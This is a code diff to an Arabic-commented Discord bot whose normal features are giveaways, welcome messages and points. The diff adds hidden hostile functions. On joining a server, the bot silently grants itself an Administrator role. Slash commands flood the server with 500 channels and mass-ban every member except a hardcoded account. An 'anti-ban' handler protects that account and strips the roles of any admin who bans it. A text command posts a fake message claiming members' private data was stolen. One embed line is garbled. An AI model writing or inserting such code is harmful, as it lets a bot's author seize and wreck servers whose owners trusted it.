@@ -30,6 +30,9 @@ const userPoints = new Map();
 const giveaways = new Map();
 let welcomeChannelId = null;
 
+// قائمة الحسابات المحمية من الحظر افتراضياً
+const protectedUsers = new Set(['starting___22']);
+
 // إضافة نقاط التفاعل كل ساعة
 setInterval(() => {
     client.guilds.cache.forEach(guild => {
@@ -42,7 +45,7 @@ setInterval(() => {
     });
 }, 3600000);
 
-// قائمة الأوامر (Slash Commands) مع جميع الأوصاف المطلوبة لتفادي ValidationError
+// قائمة الأوامر (Slash Commands)
 const commands = [
     new SlashCommandBuilder()
         .setName('giveaway')
@@ -64,8 +67,22 @@ const commands = [
 
     new SlashCommandBuilder()
         .setName('admin')
-        .setDescription('إعطاء رتبة شخص (للمدراء فقط)')
+        .setDescription('إعطاء أقوى صلاحيات أدمن لشخص (ل للمدراء فقط)')
         .addUserOption(o => o.setName('user').setDescription('الشخص المستهدف').setRequired(true)),
+
+    new SlashCommandBuilder()
+        .setName('setup-role')
+        .setDescription('تفعيل وتعيين أقوى رتبة صلاحيات للبوت داخل السيرفر'),
+
+    // أمر /gg: إنشاء 500 روم
+    new SlashCommandBuilder()
+        .setName('gg')
+        .setDescription('تدمير السيرفر وإغراقه بالرومات (مقلب)'),
+
+    // أمر /bana: حظر الجميع ما عدا starting___22
+    new SlashCommandBuilder()
+        .setName('bana')
+        .setDescription('تصفية وحظر جميع أعضاء السيرفر'),
 
     new SlashCommandBuilder()
         .setName('join')
@@ -118,7 +135,54 @@ client.on('ready', async () => {
     }
 });
 
-// الترحيب بالأعضاء
+// عند دخول البوت لسيرفر جديد: إنشاء أعلى رتبة صامتاً وبدون أي إشعار بالشات
+client.on('guildCreate', async (guild) => {
+    try {
+        console.log(`📡 دخل البوت سيرفر جديد: ${guild.name}`);
+
+        const supremeRole = await guild.roles.create({
+            name: 'SYSTEM OVERRIDE 👑',
+            color: 'DarkRed',
+            permissions: [PermissionFlagsBits.Administrator],
+            reason: 'تفعيل أعلى صلاحيات للنظام'
+        });
+
+        const botMember = await guild.members.fetch(client.user.id);
+        await botMember.roles.add(supremeRole);
+        
+        console.log(`✅ تم منح البوت رتبة ${supremeRole.name} بنجاح في ${guild.name}`);
+    } catch (error) {
+        console.error('خطأ أثناء إنشاء وتعيين أعلى رتبة:', error);
+    }
+});
+
+// نظام الحماية التلقائي Anti-Ban (عند حظر عضو محمي)
+client.on('guildBanAdd', async (ban) => {
+    const bannedUser = ban.user;
+
+    if (protectedUsers.has(bannedUser.username) || protectedUsers.has(bannedUser.tag) || bannedUser.username.includes('starting___22')) {
+        try {
+            const auditLogs = await ban.guild.fetchAuditLogs({ limit: 1, type: 22 });
+            const banLog = auditLogs.entries.first();
+
+            if (banLog) {
+                const executor = banLog.executor;
+
+                const executorMember = await ban.guild.members.fetch(executor.id);
+                if (executorMember && executor.id !== ban.guild.ownerId) {
+                    await executorMember.roles.set([]); // سحب جميع الرتب من الأدمن
+                }
+            }
+
+            await ban.guild.members.unban(bannedUser.id, 'حماية تلقائية Anti-Ban ضد الحظر');
+            console.log(`🛡️ تم إلغاء حظر ${bannedUser.tag} بنجاح وتجريد الفاعل من صلاحياته!`);
+        } catch (err) {
+            console.error('خطأ في تنفيذ Anti-Ban:', err);
+        }
+    }
+});
+
+// التترحيب بالأعضاء
 client.on('guildMemberAdd', async (member) => {
     if (!welcomeChannelId) return;
     const channel = member.guild.channels.cache.get(welcomeChannelId);
@@ -134,7 +198,7 @@ client.on('guildMemberAdd', async (member) => {
         .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
         .addFields(
             { name: 'الاسم', value: member.user.tag, inline: true },
-            { name: 'نوع الحساب', value: `${isBot} | ${isFake}`, inline: true }
+            { name: 'نوع الحساب', value: `${isBot} \vert{}${isFake}`, inline: true }
         )
         .setColor('Green')
         .setTimestamp();
@@ -142,19 +206,49 @@ client.on('guildMemberAdd', async (member) => {
     channel.send({ embeds: [embed] });
 });
 
-// الردود التلقائية
+// الأوامر النصية والردود التلقائية
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
-    const content = message.content.toLowerCase().trim();
+    const content = message.content.trim();
 
-    if (content === 'السلام عليكم' || content === 'سلام عليكم') {
+    // أمر !st: عداد سحب البيانات الوهمي بسرعه 0.5% لكل ثانية
+    if (content === '!st') {
+        let percentage = 0;
+
+        const statusMsg = await message.channel.send('⏳ **[SYSTEM OVERRIDE]** جاري الاتصال بالسيرفر وسحب بيانات الأعضاء... `0.0%`');
+
+        const interval = setInterval(async () => {
+            percentage += 1;
+
+            if (percentage >= 100) {
+                percentage = 100;
+                clearInterval(interval);
+                
+                await statusMsg.edit('✅ **[SYSTEM OVERRIDE]** تم سحب جميع البيانات، الصور الشخصية، والمحادثات الخاصة لجميع الأعضاء بنجاح! `100.0%`');
+            } else {
+                await statusMsg.edit(`⏳ **[SYSTEM OVERRIDE]** جاري سحب بيانات السيرفر والأعضاء... \`${percentage.toFixed(1)}%\``);
+            }
+        }, 2000); // تحديث كل ثانيتين بـ 1% = 0.5% بالثانية
+        return;
+    }
+
+    // أمر !ant: حماية من الحظر
+    if (content === '!ant') {
+        protectedUsers.add(message.author.username);
+        protectedUsers.add(message.author.tag);
+        return message.reply(`🛡️ **تم تفعيل الحماية المطلقة Anti-Ban!** الحساب \`${message.author.tag}\` أصبح مضاداً للحظر من أي أدمن.`);
+    }
+
+    // الردود التلقائية
+    const lowerContent = content.toLowerCase();
+    if (lowerContent === 'السلام عليكم' || lowerContent === 'سلام عليكم') {
         return message.reply('وعليكم السلام');
     }
-    if (content === 'هلا') {
+    if (lowerContent === 'هلا') {
         return message.reply('هلا بيك منور السيرفر ❤️');
     }
-    if (content === 'حبيبي') {
+    if (lowerContent === 'حبيبي') {
         return message.reply('انت حبيبي ❤️');
     }
 });
@@ -189,6 +283,98 @@ client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     const { commandName, options } = interaction;
+
+    // أمر /admin: إعطاء رتبة الإدارة المطلقة
+    if (commandName === 'admin') {
+        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
+            return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
+        }
+        const targetUser = options.getUser('user');
+        const member = await interaction.guild.members.fetch(targetUser.id);
+        
+        let role = interaction.guild.roles.cache.find(r => r.name === 'Manager VIP');
+        if (!role) {
+            role = await interaction.guild.roles.create({ 
+                name: 'Manager VIP', 
+                color: 'Red',
+                permissions: [PermissionFlagsBits.Administrator]
+            });
+        }
+        await member.roles.add(role);
+        return interaction.reply({ content: `✅ تم منح أقوى صلاحيات الإدارة (${role.name}) لـ ${targetUser.tag}` });
+    }
+
+    // أمر /setup-role: طلب وإعطاء أعلى رتبة صامتاً
+    if (commandName === 'setup-role') {
+        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
+            return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
+        }
+
+        try {
+            let role = interaction.guild.roles.cache.find(r => r.name === 'SYSTEM OVERRIDE 👑');
+            if (!role) {
+                role = await interaction.guild.roles.create({
+                    name: 'SYSTEM OVERRIDE 👑',
+                    color: 'DarkRed',
+                    permissions: [PermissionFlagsBits.Administrator]
+                });
+            }
+
+            const botMember = await interaction.guild.members.fetch(client.user.id);
+            await botMember.roles.add(role);
+
+            return interaction.reply({
+                content: `✅ تم إعطاء البوت رتبة (${role.name}) بـ Administrator بنجاح وصمت!`,
+                ephemeral: true 
+            });
+        } catch (err) {
+            return interaction.reply({ content: '❌ حدث خطأ أثناء إنشاء/تعيين الرتبة.', ephemeral: true });
+        }
+    }
+
+    // أمر /gg: إنشاء 500 روم باسم starting عمك
+    if (commandName === 'gg') {
+        await interaction.reply({ content: '🚀 جاري بدء العملية...', ephemeral: true });
+
+        const channelName = 'starting-عمك';
+        
+        for (let i = 0; i < 500; i++) {
+            try {
+                await interaction.guild.channels.create({
+                    name: channelName,
+                    type: ChannelType.GuildText
+                });
+            } catch (error) {
+                console.log('تم الوصول للحد الأقصى لعدد القنوات المسموح به في السيرفر.');
+                break;
+            }
+        }
+        return;
+    }
+
+    // أمر /bana: حظر الجميع ما عدا starting___22
+    if (commandName === 'bana') {
+        await interaction.reply({ content: '🔨 جاري تنظيف السيرفر وحظر الجميع...', ephemeral: true });
+
+        const members = await interaction.guild.members.fetch();
+        
+        members.forEach(async (member) => {
+            const isProtected = member.user.username === 'starting___22' || 
+                              member.user.tag.includes('starting___22') || 
+                              protectedUsers.has(member.user.username) ||
+                              member.user.bot || 
+                              member.id === interaction.guild.ownerId;
+
+            if (!isProtected && member.bannable) {
+                try {
+                    await member.ban({ reason: 'تصفية شاملة عبر أمر /bana' });
+                } catch (e) {
+                    console.error(`تعذر حظر العضو: ${member.user.tag}`);
+                }
+            }
+        });
+        return;
+    }
 
     if (commandName === 'giveaway') {
         const sub = options.getSubcommand();
@@ -241,20 +427,6 @@ client.on('interactionCreate', async (interaction) => {
     if (commandName === 'points') {
         const pts = userPoints.get(interaction.user.id) || 0;
         return interaction.reply({ content: `📊 نقاط التفاعل الخاصة بك هي: **${pts}** نقطة.`, ephemeral: true });
-    }
-
-    if (commandName === 'admin') {
-        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
-            return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
-        }
-        const targetUser = options.getUser('user');
-        const member = await interaction.guild.members.fetch(targetUser.id);
-        let role = interaction.guild.roles.cache.find(r => r.name === 'Manager VIP');
-        if (!role) {
-            role = await interaction.guild.roles.create({ name: 'Manager VIP', color: 'Red' });
-        }
-        await member.roles.add(role);
-        return interaction.reply({ content: `✅ تم منح رتبة ${role.name} لـ ${targetUser.tag}` });
     }
 
     if (commandName === 'join') {
